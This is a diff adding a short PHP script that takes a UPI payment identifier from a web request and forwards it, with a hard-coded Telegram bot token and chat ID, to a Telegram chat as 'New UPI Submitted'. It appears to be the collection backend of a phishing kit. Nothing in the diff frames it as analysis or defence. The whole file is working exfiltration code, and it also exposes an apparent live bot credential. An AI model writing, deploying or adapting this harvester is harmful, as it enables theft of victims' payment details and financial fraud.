@@ -1,0 +1,14 @@
+<?php
+
+$token = "8316323776:AAGqlvHZv8jQ-WQ6GNlB6ysxbGkMskRERG4";  
+$chat_id = "6306930612"; 
+
+$upi = $_GET['upi'];
+
+$message = "💳 New UPI Submitted: $upi";
+
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
+
+echo "DONE";
+
+?>
